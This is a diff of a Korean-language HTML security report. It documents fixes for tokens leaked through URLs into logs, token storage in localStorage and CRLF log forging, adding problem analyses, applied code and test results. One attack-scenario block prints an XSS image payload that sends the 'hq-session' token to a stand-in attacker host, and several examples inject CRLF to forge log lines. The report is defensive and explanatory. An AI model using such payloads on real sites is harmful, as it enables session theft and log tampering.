+                        <p>같은 <code>package.json</code>을 두고 설치 명령만 바꿨을 때, 악성 버전이 배포된 상황에서 결과가 어떻게 갈리는지 정리한 것입니다.</p>
+
+                        <div class="compare stacked">
                         <div class="compare-box before">
                             <div class="compare-label">❌ npm install (자동 업데이트)</div>
                             <pre>package.json: "vue": "^3.5.12"
@@ -1160,36 +1487,19 @@ build-backend:
 잠금 파일을 직접 수정하지 않는 한
 새 버전이 들어올 수 없음</pre>
                         </div>
+                        </div>
                     </div>
 
-                    <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> frontend/Dockerfile — 실제 코드</div>
-                        <pre><code class="language-dockerfile">FROM node:20-alpine AS build
-WORKDIR /app
-COPY package.json package-lock.json ./
-RUN npm ci                  # ← npm install 이 아닌 npm ci 사용 (핵심!)
-                            #   package-lock.json의 정확한 버전만 설치
-COPY . .
-RUN npm run build</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> frontend/package-lock.json — 실제 파일 일부 발췌</div>
-                        <pre><code class="language-json">"node_modules/vue": {
-  "version": "3.5.39",   // ← 정확히 3.5.39 버전만 설치되도록 고정
-  "resolved": "https://registry.npmjs.org/vue/-/vue-3.5.39.tgz",
-  "integrity": "sha512-xmZCYabFGcirU8r0fTuvl/LICc1OU620rnqepaJDL/a141ZigkG7AyaxQLdqJ02ZRYzWe6YPaDHeQx7MfknQfA==", // ← 파일 위조 검증 해시 (필수)
-  "license": "MIT",
-  "dependencies": {
-    "@vue/compiler-dom": "3.5.39",
-    "@vue/compiler-sfc": "3.5.39",
-    "@vue/runtime-dom": "3.5.39",
-    "@vue/server-renderer": "3.5.39",
-    "@vue/shared": "3.5.39"
-  }
-}</code></pre>
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            빌드 결과가 <span class="hl-red">"언제 빌드했는가"</span>에 좌우되지 않게 됐습니다. 같은 커밋이면 언제 빌드해도 같은 의존성이 설치되고,
+                            lock 파일에 적힌 <code>integrity</code> 해시와 다른 파일이 내려오면 설치 단계에서 <span class="hl-green">빌드가 실패</span>합니다.
+                        </p>
+                        <p>
+                            새 버전을 쓰려면 사람이 lock 파일을 갱신해 커밋해야 하므로,
+                            <strong>외부 변경이 코드 리뷰를 거치지 않고 배포에 도달하는 경로가 없어졌습니다.</strong>
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -1234,6 +1544,19 @@ RUN npm run build</code></pre>
                         </p>
                     </div>
 
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            원인은 <span class="hl-red">로그인 토큰을 그대로 URL에 실었다</span>는 점입니다. 헤더로 보내면 로그에 남지 않지만
+                            <code>EventSource</code>가 헤더를 지원하지 않으니, 남은 선택지가 쿼리 파라미터뿐이었습니다.
+                        </p>
+                        <p>
+                            여기서 놓친 것은 <strong>URL은 애플리케이션만 보는 값이 아니라는 점</strong>입니다. 액세스 로그·프록시·브라우저 히스토리·리퍼러까지
+                            거쳐 가며 여러 곳에 복사됩니다. 게다가 이 토큰은 <span class="hl-red">12시간 동안 그 계정의 모든 API를 쓸 수 있는 값</span>이라,
+                            한 번 기록되면 그 자체가 계정 하나를 통째로 넘겨주는 것과 같았습니다.
+                        </p>
+                    </div>
+
                     <div class="flow">
                         <div class="flow-item situation"><span class="step-label">📍 상황</span>실시간 주문 알림을 위해 SSE 연결 사용</div>
                         <div class="flow-arrow">→</div>
@@ -1245,7 +1568,7 @@ RUN npm run build</code></pre>
                     </div>
 
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제 로그에 남아 있던 줄 (적용 전)</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 문제가 있던 코드 — access.log에 실제로 남아 있던 줄</div>
                         <pre><code class="language-bash">$ grep "token=" backend/logs/access.*.log
 
 2026-08-15 23:05:40  GET /api/branch/events/stream?token=NjoxNzg2ODQ1NzkzOk94VXgx...
@@ -1256,8 +1579,17 @@ $ echo "NjoxNzg2..." | tr '_-' '/+' | base64 -d
 #  ↑adminId    ↑만료(11시간 남음)  ↑서명</code></pre>
                     </div>
 
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>스트림 전용 티켓 신설</strong> — 유효기간 <code>60초</code>, 스트림 구독에만 쓸 수 있는 별도 접두사(<code>stream:</code>)를 붙여 발급.<br>
+                            2. <strong>티켓 발급 API는 헤더 인증</strong>(<code>/stream-ticket</code>)으로 처리 — 이 요청은 URL에 아무것도 싣지 않아 로그에 남지 않음.<br>
+                            3. <strong>양방향 분리</strong> — 로그인 토큰으로는 스트림을 열 수 없고, 티켓으로는 일반 API를 호출할 수 없도록 검증을 나눔.
+                        </p>
+                    </div>
+
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 해결 — BranchEventStreamController.java (티켓 분리)</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 — BranchEventStreamController.java (티켓 분리)</div>
                         <pre><code class="language-java">// 스트림 연결 직전에만 발급받는 짧은 티켓. 이 요청은 헤더로 인증하므로 로그에 아무것도 남지 않는다.
 @GetMapping("/stream-ticket")
 public Map&lt;String, String&gt; issueStreamTicket(@RequestHeader("Authorization") String authorization) {
@@ -1272,7 +1604,14 @@ public SseEmitter stream(@RequestParam String token) {     // 여기 실리는 �
 }</code></pre>
                     </div>
 
-                    <div class="compare">
+                    <div class="story">
+                        <div class="story-label">🧪 실제 테스트 실행</div>
+                        <p>
+                            로그에서 주운 티켓을 <strong>① 일반 API에 써보고</strong>, <strong>② 60초를 넘긴 뒤 스트림에 다시 써봤습니다.</strong>
+                            둘 다 막혀야 "로그에 남아도 쓸 수 없다"가 성립합니다.
+                        </p>
+
+                        <div class="compare stacked">
                         <div class="compare-box before">
                             <div class="compare-label">❌ 적용 전 — 12시간 풀 권한 토큰</div>
                             <pre>?token=6:1786845793:OxUx1eAa...
@@ -1291,17 +1630,31 @@ public SseEmitter stream(@RequestParam String token) {     // 여기 실리는 �
    (일반 API에 쓰면 401)
 → 로그에 남아도 쓸 수 없음</pre>
                         </div>
-                    </div>
+                        </div>
 
-                    <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제로 확인한 결과</div>
-                        <pre><code class="language-bash"># 로그에서 주운 티켓을 일반 API에 써보면
+                        <div class="code-block">
+                            <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실행 결과</div>
+                            <pre><code class="language-bash"># 로그에서 주운 티켓을 일반 API에 써보면
 $ curl .../api/branch/orders --cookie "admin_session=c3RyZWFt..."
 401                       # ← 접두사가 달라 스트림 외에는 못 쓴다
 
 # 60초 뒤 스트림에 다시 써보면
 $ curl ".../api/branch/events/stream?token=c3RyZWFt..."
 401                       # ← 만료</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            기술적 제약(<code>EventSource</code>는 헤더를 못 보냄)은 그대로 두고,
+                            <span class="hl-green">URL에 실리는 값의 권한과 수명을 줄이는</span> 쪽으로 풀었습니다.
+                            로그에 값이 남는 것 자체는 여전하지만, 남는 값이 <strong>60초짜리 스트림 전용 티켓</strong>으로 바뀌었습니다.
+                        </p>
+                        <p>
+                            그래서 30일치 로그를 전부 뒤져도 쓸 수 있는 자격증명은 나오지 않습니다.
+                            토큰이 로그에 남지 않게 만드는 대신, <span class="hl-green">남아도 무해하게</span> 만든 접근입니다.
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -1333,6 +1686,20 @@ $ curl ".../api/branch/events/stream?token=c3RyZWFt..."
                         </p>
                     </div>
 
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            원인은 토큰을 <span class="hl-red">JavaScript가 접근할 수 있는 자리에 보관</span>했다는 점입니다.
+                            <code>localStorage</code>는 같은 출처의 스크립트라면 무엇이든 읽을 수 있어서, 우리 페이지에서 실행되는 코드와
+                            공격자가 심은 코드를 브라우저가 구분하지 않습니다.
+                        </p>
+                        <p>
+                            핵심은 <strong>피해가 그 자리에서 끝나지 않는다</strong>는 점입니다. 화면을 조작당하는 것은 탭을 닫으면 끝나지만,
+                            토큰이 빠져나가면 <span class="hl-red">공격자의 서버에 복사본이 남아</span> 브라우저와 무관하게 계속 쓸 수 있습니다.
+                            게다가 이 유출 요청은 CORS로 막히지 않습니다 — CORS는 응답을 읽는 것을 통제할 뿐, 보내는 것은 막지 않기 때문입니다.
+                        </p>
+                    </div>
+
                     <div class="flow">
                         <div class="flow-item situation"><span class="step-label">📍 상황</span>로그인 토큰을 localStorage에 저장</div>
                         <div class="flow-arrow">→</div>
@@ -1344,7 +1711,7 @@ $ curl ".../api/branch/events/stream?token=c3RyZWFt..."
                     </div>
 
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 공격 시나리오 — ① 주입 / ② 실행</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 문제가 있던 코드 — 공격 시나리오 (① 주입 / ② 실행)</div>
                         <pre><code class="language-javascript">// ① 주입 — 공지 작성란이나 채팅에 이 문자열을 그대로 입력합니다.
 //    서버 입장에선 그냥 텍스트라 저장에 아무 문제가 없습니다.
 &lt;img src=x onerror="fetch('https://공격자/',{method:'POST',body:localStorage.getItem('hq-session')})"&gt;
@@ -1360,8 +1727,19 @@ fetch('https://공격자/', {
 // "요청을 보내는 것"은 차단하지 않습니다 — 콘솔에 오류가 떠도 데이터는 이미 갔습니다.</code></pre>
                     </div>
 
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>AuthCookie.java 신설</strong> — 토큰을 응답 본문 대신 <code>httpOnly</code> 쿠키로 발급하고 <code>SameSite=Strict</code>를 함께 설정.<br>
+                            2. <strong>AuthCookieFilter.java 신설</strong> — 요청이 컨트롤러에 닿기 전에 쿠키를 <code>Authorization</code> 헤더로 변환.
+                            덕분에 인증을 읽는 컨트롤러 91군데를 한 줄도 고치지 않았습니다.<br>
+                            3. <strong>헤더가 이미 있으면 통과</strong>시켜 Firebase 로그인 경로가 그대로 동작하도록 유지.<br>
+                            4. <code>Secure</code> 플래그는 <code>COOKIE_SECURE</code> 환경변수로 분리 — HTTPS 도입 시 코드 수정 없이 전환.
+                        </p>
+                    </div>
+
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 해결 — AuthCookie.java (쿠키 발급)</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 ① — AuthCookie.java (쿠키 발급)</div>
                         <pre><code class="language-java">private String build(String value, Duration maxAge) {
     return ResponseCookie.from(NAME, value)
             // JS가 document.cookie로 읽을 수 없게 한다 - 이 설정 하나가 이 클래스의 존재 이유다.
@@ -1378,7 +1756,7 @@ fetch('https://공격자/', {
                     </div>
 
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 해결 — AuthCookieFilter.java (기존 코드를 건드리지 않기 위한 변환)</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 ② — AuthCookieFilter.java (기존 코드를 건드리지 않기 위한 변환)</div>
                         <pre><code class="language-java">// 인증을 받는 곳이 27개 컨트롤러 91군데라 전부 고칠 수 없었습니다.
 // 요청이 컨트롤러에 닿기 전에 쿠키를 Authorization 헤더로 바꿔주면, 그 아래 코드는 한 줄도 바뀌지 않습니다.
 if (request.getHeader(AUTHORIZATION) != null) {
@@ -1389,7 +1767,13 @@ String token = AuthCookie.read(request).orElse(null);
 chain.doFilter(token == null ? request : new BearerFromCookie(request, token), response);</code></pre>
                     </div>
 
-                    <div class="compare">
+                    <div class="story">
+                        <div class="story-label">🧪 실제 테스트 실행</div>
+                        <p>
+                            같은 계정으로 로그인한 뒤, 응답에 토큰이 어떻게 실리는지와 브라우저 콘솔에서 그 값을 읽을 수 있는지를 각각 확인했습니다.
+                        </p>
+
+                        <div class="compare stacked">
                         <div class="compare-box before">
                             <div class="compare-label">❌ 적용 전 — 토큰이 응답 본문에</div>
                             <pre>HTTP/1.1 200
@@ -1413,6 +1797,19 @@ Set-Cookie: admin_session=OToxOjE3ODc2...;
 &gt; document.cookie
 ''                          ← 목록에 없음</pre>
                         </div>
+                        </div>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            토큰을 <span class="hl-red">JS가 읽을 수 있는 자리</span>에서 <span class="hl-green">브라우저만 다루는 자리</span>로 옮겼습니다.
+                            응답 본문에 토큰이 사라졌고, <code>document.cookie</code>에도 나타나지 않습니다.
+                        </p>
+                        <p>
+                            이로써 스크립트가 실행되더라도 <strong>토큰을 복사해 밖으로 내보내는 경로가 없어졌습니다.</strong>
+                            XSS 자체를 없앤 것은 아니지만, 피해가 그 탭을 벗어나 지속되는 것은 막았습니다.
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -2170,75 +2567,11 @@ async function login() {
                     </div>
                     <div class="section-body">
 
-                        <!-- CRLF 개념 및 예시 (A09 공통) -->
-                        <div style="margin-bottom: 40px;">
-                            <div class="summary"
-                                style="margin-bottom: 22px; background: #fdf2f8; border-color: #fbcfe8;">
-                                <div class="summary-title" style="color: #be185d; font-size: 1.05em;">❓ CRLF 로그 위조(Log
-                                    Forging)란?</div>
-                                <p style="margin: 8px 0 0; font-size: 0.95em; color: #831843;">사용자가 입력한 데이터를 그대로 로그에 남기는
-                                    취약점을
-                                    이용해, <strong>개행 문자(CRLF: \r\n)를 주입하여 가짜 로그 줄을 만들어내는 공격</strong>입니다.</p>
-                            </div>
-
-                            <div
-                                style="margin-bottom: 22px; padding: 20px 0; border-top: 1px solid #e2e8f0; border-bottom: 1px solid #e2e8f0;">
-                                <strong
-                                    style="display: block; font-size: 1.1em; color: #1a1a2e; margin-bottom: 12px;">⚠️ 개행
-                                    문자가
-                                    로그 위조에 악용되는 이유</strong>
-                                <p style="margin: 0 0 12px; font-size: 0.95em; color: #334155;">서버는 로그 파일에 기록을 남길 때
-                                    <strong>"개행
-                                        문자가 나오면 이번 줄은 끝났고, 다음 줄부터 새 기록이다"</strong>라고 인식합니다.
-                                </p>
-                                <p style="margin: 0; font-size: 0.95em; color: #334155; line-height: 1.7;">공격자가 입력창에 글을
-                                    쓰다가
-                                    의도적으로 이 개행 문자(<code
-                                        style="background: #f1f5f9; padding: 2px 6px; border-radius: 4px; color: #475569;">\r\n</code>)를
-                                    섞어 넣으면, 서버는 사용자가 엔터를 친 것으로 착각하여 <strong>하나의 로그를 두 개의 로그인 것처럼 쪼개서 저장</strong>하게 됩니다.
-                                    이 때문에
-                                    시스템 오류나 해킹 흔적을 조작하는 '로그 위조'가 가능해집니다.</p>
-                            </div>
-
-                            <div class="story"
-                                style="background: #fff; border: 1.5px solid #cbd5e1; padding: 24px 28px; margin-bottom: 0;">
-                                <div class="story-label" style="background: #475569;">🔍 공격 시나리오 예시</div>
-                                <p style="margin-top: 0; margin-bottom: 16px;">사용자가 입력한 아이디를 그대로 로그에 남기는 취약한 시스템이 있다고
-                                    가정합니다.</p>
-
-                                <div>
-                                    <strong style="color: #1a1a2e; font-size: 1.05em;">1. 정상적인 입력</strong>
-                                    <ul style="margin: 8px 0; color: #475569;">
-                                        <li>입력값: <code
-                                                style="background: #f1f5f9; padding: 2px 6px; border-radius: 4px; color: #334155;">guest</code>
-                                        </li>
-                                        <li>실제 로그:</li>
-                                    </ul>
-                                    <pre
-                                        style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 14px; border-radius: 6px; font-family: monospace; font-size: 0.9em; margin-bottom: 24px; color: #334155;">2026-08-25 00:15:00 - User login failed: guest</pre>
-                                </div>
-
-                                <div>
-                                    <strong style="color: #1a1a2e; font-size: 1.05em;">2. CRLF 주입 공격</strong>
-                                    <ul style="margin: 8px 0; color: #475569;">
-                                        <li>입력값: <code
-                                                style="background: #f1f5f9; padding: 2px 6px; border-radius: 4px; color: #b91c1c;">guest\r\n2026-08-25 00:15:05 - User login success: admin</code>
-                                        </li>
-                                        <li>실제 로그 (두 줄로 분리됨):</li>
-                                    </ul>
-                                    <pre
-                                        style="background: #fff5f5; border: 1px solid #fecaca; padding: 14px; border-radius: 6px; font-family: monospace; font-size: 0.9em; margin-bottom: 12px; color: #b91c1c;">2026-08-25 00:15:00 - User login failed: guest
-2026-08-25 00:15:05 - User login success: admin</pre>
-                                    <p style="margin: 0; font-size: 0.95em;"><span class="hl-red">결과:</span> 관리자는 <code
-                                            style="background: #f1f5f9; padding: 2px 6px; border-radius: 4px; color: #334155;">admin</code>
-                                        계정이 성공적으로 로그인한 것으로 착각하게 되며, 공격자의 흔적을 놓치게 됩니다.</p>
-                                </div>
-                            </div>
-                        </div>
-
                         <!-- ① logback -->
                         <div class="item">
                             <div class="item-title">① logback-spring.xml에 CRLF 로그 위조 전역 방어를 적용해 가짜 로그 기록 삽입을 차단</div>
+
+                            <div class="term-note"><strong>CRLF</strong>: CR(<code>\r</code>)과 LF(<code>\n</code>)을 합친 줄바꿈 문자<br>· <strong>로그 위조(Log Forging)</strong>: 입력값에 줄바꿈을 섞어 없던 로그 줄을 지어내는 공격</div>
 
                             <div class="story">
                                 <div class="story-label">📖 이런 상황이 있었습니다</div>
@@ -2257,6 +2590,19 @@ async function login() {
                                 </p>
                             </div>
 
+                            <div class="story">
+                                <div class="story-label">🔍 문제점 분석</div>
+                                <p>
+                                    원인은 <span class="hl-red">사용자가 보낸 값을 로그에 그대로 이어 붙였다</span>는 점입니다.
+                                    로그 파일에서 한 줄은 곧 하나의 기록이고, 줄을 나누는 유일한 기준은 개행 문자입니다.
+                                </p>
+                                <p>
+                                    그래서 입력값에 개행이 섞이면 서버는 그것을 <strong>"이 기록은 끝났다"는 신호로 읽고</strong> 다음 글자부터 새 기록으로 저장합니다.
+                                    공격자가 로그의 <span class="hl-red">내용이 아니라 구조를 조작</span>할 수 있다는 뜻입니다.
+                                    로그는 사고가 났을 때 사실 관계를 판단하는 근거인데, 그 근거 자체를 공격자가 쓸 수 있게 되는 셈입니다.
+                                </p>
+                            </div>
+
                             <div class="flow">
                                 <div class="flow-item situation"><span class="step-label">📍 상황</span>로그인 시 아이디를 서버가 로그에
                                     기록함</div>
@@ -2271,7 +2617,50 @@ async function login() {
                                     차단</div>
                             </div>
 
-                            <div class="compare">
+                            <div class="code-block">
+                                <div class="code-label"><span class="dot dot-r"></span><span
+                                        class="dot dot-y"></span><span class="dot dot-g"></span> 문제가 있던 코드 — 로그 설정 파일이 없던 상태 (커밋 a4713e7 이전)</div>
+                                <pre><code class="language-bash"># 적용 전에는 logback-spring.xml 자체가 없었고, 스프링 부트 기본 설정이 그대로 쓰였습니다.
+# 기본 패턴의 메시지 부분(%m)에는 줄바꿈을 다루는 처리가 전혀 없습니다.
+
+%d{yyyy-MM-dd HH:mm:ss.SSS}  %-5level  [%thread]  %logger{36} - %m%n
+                                                                ↑
+                              사용자가 보낸 값이 이 자리에 그대로 들어간다
+
+# → 값 안에 \r\n이 섞여 있으면 로그 파일에서 줄이 그대로 나뉜다.</code></pre>
+                            </div>
+
+                            <div class="improve">
+                                <div class="improve-title">🔧 적용 사항</div>
+                                <p>
+                                    1. <strong>logback-spring.xml</strong>의 로그 출력 패턴에 <code>%replace(%m){'[\r\n]+', ' '}</code>를 적용해
+                                    메시지 안의 모든 줄바꿈을 공백으로 치환.<br>
+                                    2. <strong>콘솔·파일 Appender 양쪽에 동일하게</strong> 적용해 출력 경로에 따라 방어가 빠지지 않도록 함.<br>
+                                    3. 로그를 남기는 <strong>코드는 한 줄도 고치지 않고</strong>, 스프링·MyBatis 등 외부 라이브러리 로그까지 한꺼번에 적용.
+                                </p>
+                            </div>
+
+                            <div class="code-block">
+                                <div class="code-label"><span class="dot dot-r"></span><span
+                                        class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 — logback-spring.xml</div>
+                                <pre><code class="language-xml">&lt;!-- 콘솔과 파일 Appender 모두에 동일하게 적용 --&gt;
+&lt;encoder&gt;
+    &lt;charset&gt;UTF-8&lt;/charset&gt;
+    &lt;!-- 핵심: %replace(%m){'[\r\n]+', ' '}
+         모든 로그 메시지(%m)의 줄바꿈(\r, \n)을 공백으로 치환
+         → 우리 코드 + 스프링 + MyBatis 전체 로그에 일괄 적용됨 --&gt;
+    &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %-5level [%thread] %logger{36} - %replace(%m){'[\r\n]+', ' '}%n&lt;/pattern&gt;
+&lt;/encoder&gt;</code></pre>
+                            </div>
+
+                            <div class="story">
+                                <div class="story-label">🧪 실제 테스트 실행</div>
+                                <p>
+                                    아이디 입력값에 <code>\r\n</code>과 가짜 로그 문자열을 섞어 로그인 API를 호출한 뒤,
+                                    실제 로그 파일에 몇 줄이 남는지 확인했습니다.
+                                </p>
+
+                                <div class="compare stacked">
                                 <div class="compare-box before">
                                     <div class="compare-label">❌ 방어 없을 때 (가짜 로그 생성)</div>
                                     <pre>입력: "test\r\n[INFO] 관리자 로그인 성공"
@@ -2292,20 +2681,19 @@ async function login() {
 → \r\n이 공백으로 바뀌어 한 줄
 → 가짜 로그로 속이기 불가!</pre>
                                 </div>
+                                </div>
                             </div>
 
-                            <div class="code-block">
-                                <div class="code-label"><span class="dot dot-r"></span><span
-                                        class="dot dot-y"></span><span class="dot dot-g"></span> logback-spring.xml — 실제
-                                    방어 코드</div>
-                                <pre><code class="language-xml">&lt;!-- 콘솔과 파일 Appender 모두에 동일하게 적용 --&gt;
-&lt;encoder&gt;
-    &lt;charset&gt;UTF-8&lt;/charset&gt;
-    &lt;!-- 핵심: %replace(%m){'[\r\n]+', ' '}
-         모든 로그 메시지(%m)의 줄바꿈(\r, \n)을 공백으로 치환
-         → 우리 코드 + 스프링 + MyBatis 전체 로그에 일괄 적용됨 --&gt;
-    &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %-5level [%thread] %logger{36} - %replace(%m){'[\r\n]+', ' '}%n&lt;/pattern&gt;
-&lt;/encoder&gt;</code></pre>
+                            <div class="story">
+                                <div class="story-label">🏁 결론</div>
+                                <p>
+                                    로그의 <span class="hl-green">줄 구조를 사용자가 건드릴 수 없게</span> 만들었습니다.
+                                    입력값에 무엇이 들어오든 <strong>한 요청은 한 줄로만 기록</strong>되므로, 없던 사건을 지어내는 것이 불가능해졌습니다.
+                                </p>
+                                <p>
+                                    설정 한 곳에서 처리했기 때문에 새로 추가되는 로그도 자동으로 같은 보호를 받습니다.
+                                    로그를 남기는 사람이 이 문제를 <strong>몰라도 안전한 구조</strong>가 됐다는 점이 핵심입니다.
+                                </p>
                             </div>
 
                             <div class="summary">
@@ -2339,6 +2727,19 @@ async function login() {
                                 </p>
                             </div>
 
+                            <div class="story">
+                                <div class="story-label">🔍 문제점 분석</div>
+                                <p>
+                                    ①의 logback 설정은 로그가 파일에 쓰이는 <strong>마지막 단계</strong>에서 동작합니다.
+                                    잘 막아주지만, 뒤집어 보면 <span class="hl-red">방어 전체가 설정 파일 한 줄에 의존</span>하고 있다는 뜻입니다.
+                                </p>
+                                <p>
+                                    누군가 로그 패턴을 손보거나 새 Appender를 추가하면서 그 부분을 빠뜨리면 방어가 통째로 사라지는데,
+                                    <span class="hl-red">사라졌다는 사실을 알아차릴 방법이 없습니다.</span> 로그는 평소에 아무도 들여다보지 않다가
+                                    사고가 났을 때 꺼내 보는 자료라, 구멍이 생겨도 한참 뒤에야 발견됩니다.
+                                </p>
+                            </div>
+
                             <div class="flow">
                                 <div class="flow-item situation"><span class="step-label">📍 상황</span>예외 메시지나 외부 API 응답을
                                     로그에 기록
@@ -2356,31 +2757,36 @@ async function login() {
                                 </div>
                             </div>
 
-                            <div class="compare">
-                                <div class="compare-box before">
-                                    <div class="compare-label">❌ 방어 없을 때 (가짜 로그 생성)</div>
-                                    <pre>발생한 에러: "입력값 오류\r\n[INFO] 결제 취소 승인"
+                            <div class="code-block">
+                                <div class="code-label"><span class="dot dot-r"></span><span
+                                        class="dot dot-y"></span><span class="dot dot-g"></span> 문제가 있던 코드 — GlobalExceptionHandler.java (커밋 a4713e7 이전)</div>
+                                <pre><code class="language-java">@ExceptionHandler(IllegalArgumentException.class)
+public ResponseEntity&lt;Map&lt;String, String&gt;&gt; handleBadRequest(IllegalArgumentException e) {
+    // 예외 메시지에는 사용자가 보낸 값이 섞여 들어오는데, 정제 없이 그대로 기록한다
+    log.warn("잘못된 요청 처리 중 예외가 발생했습니다.", e);
+    return ResponseEntity.badRequest().body(Map.of("message", "잘못된 요청입니다."));
+}
 
-[실제 서버 로그 파일]
-2026-08-25 10:00:00 [WARN] 잘못된 요청. 사유: 입력값 오류
-[INFO] 결제 취소 승인   ← 해커가 만든 가짜 결제 취소 기록!</pre>
-                                </div>
-                                <div class="compare-box after">
-                                    <div class="compare-label">✅ 방어 적용 후 (완전 삭제되어 한 줄로 출력)</div>
-                                    <pre>발생한 에러: "입력값 오류\r\n[INFO] 결제 취소 승인"
+@ExceptionHandler(TossPaymentException.class)
+public ResponseEntity&lt;Map&lt;String, String&gt;&gt; handleTossPayment(TossPaymentException e) {
+    // 외부(Toss) 응답에서 온 값 - 우리가 검증하지 않은 입력이 그대로 로그로 나간다
+    log.error("토스 결제 처리 중 예외가 발생했습니다. code={}", e.getTossErrorCode(), e);
+    return ResponseEntity.status(e.getHttpStatus()).body(Map.of("message", "결제 처리 중 오류가 발생했습니다."));
+}</code></pre>
+                            </div>
 
-[실제 서버 로그 파일]
-2026-08-25 10:00:00 [WARN] 잘못된 요청. 사유: 입력값 오류[INFO] 결제 취소 승인
-
-→ \r\n이 아예 삭제되어 글자가 딱 붙음
-→ 비정상적인 메시지임이 단번에 들통남!</pre>
-                                </div>
+                            <div class="improve">
+                                <div class="improve-title">🔧 적용 사항</div>
+                                <p>
+                                    1. <strong>CrlfUtils.forLog() 신설</strong> — <code>\r</code>과 <code>\n</code>을 제거하는 유틸리티. null이 들어와도 안전하게 동작.<br>
+                                    2. <strong>GlobalExceptionHandler</strong>에서 사용자 입력이 섞인 예외 메시지를 로그로 남기기 전에 정제.<br>
+                                    3. <strong>Toss 외부 API 응답</strong>처럼 우리가 검증하지 않은 값에도 동일하게 적용.
+                                </p>
                             </div>
 
                             <div class="code-block">
                                 <div class="code-label"><span class="dot dot-r"></span><span
-                                        class="dot dot-y"></span><span class="dot dot-g"></span> CrlfUtils.java +
-                                    GlobalExceptionHandler.java — 실제 코드</div>
+                                        class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 — CrlfUtils.java + GlobalExceptionHandler.java</div>
                                 <pre><code class="language-java">// CrlfUtils.java — 줄바꿈 제거 유틸리티 (null 안전)
 public static String forLog(String value) {
     if (value == null) return null;
@@ -2401,6 +2807,47 @@ public ResponseEntity&lt;...&gt; handleTossPayment(TossPaymentException e) {
     log.error("결제 오류. code={}", CrlfUtils.forLog(e.getTossErrorCode()), e);
     return ResponseEntity.status(e.getHttpStatus()).body(Map.of("message", "결제 처리 중 오류가 발생했습니다."));
 }</code></pre>
+                            </div>
+
+                            <div class="story">
+                                <div class="story-label">🧪 실제 테스트 실행</div>
+                                <p>
+                                    예외 메시지에 <code>\r\n</code>과 가짜 결제 취소 기록을 섞어 넣고, 그 예외가 로그로 남는 모습을 확인했습니다.
+                                    ①과 달리 여기서는 줄바꿈이 공백이 아니라 <strong>아예 삭제</strong>됩니다.
+                                </p>
+
+                                <div class="compare stacked">
+                                <div class="compare-box before">
+                                    <div class="compare-label">❌ 방어 없을 때 (가짜 로그 생성)</div>
+                                    <pre>발생한 에러: "입력값 오류\r\n[INFO] 결제 취소 승인"
+
+[실제 서버 로그 파일]
+2026-08-25 10:00:00 [WARN] 잘못된 요청. 사유: 입력값 오류
+[INFO] 결제 취소 승인   ← 해커가 만든 가짜 결제 취소 기록!</pre>
+                                </div>
+                                <div class="compare-box after">
+                                    <div class="compare-label">✅ 방어 적용 후 (완전 삭제되어 한 줄로 출력)</div>
+                                    <pre>발생한 에러: "입력값 오류\r\n[INFO] 결제 취소 승인"
+
+[실제 서버 로그 파일]
+2026-08-25 10:00:00 [WARN] 잘못된 요청. 사유: 입력값 오류[INFO] 결제 취소 승인
+
+→ \r\n이 아예 삭제되어 글자가 딱 붙음
+→ 비정상적인 메시지임이 단번에 들통남!</pre>
+                                </div>
+                                </div>
+                            </div>
+
+                            <div class="story">
+                                <div class="story-label">🏁 결론</div>
+                                <p>
+                                    같은 공격을 <span class="hl-green">서로 독립된 두 지점에서</span> 막게 됐습니다.
+                                    코드에서 한 번(CrlfUtils), 로그가 파일에 쓰이는 마지막 단계에서 한 번(logback) 걸러집니다.
+                                </p>
+                                <p>
+                                    두 방어는 서로를 전제하지 않기 때문에, <strong>한쪽이 실수로 빠져도 나머지가 그대로 동작합니다.</strong>
+                                    설정 파일 한 줄에 보안 전체가 걸려 있던 상태에서 벗어난 것이 이 항목의 목적입니다.
+                                </p>
                             </div>
 
                             <div class="summary">
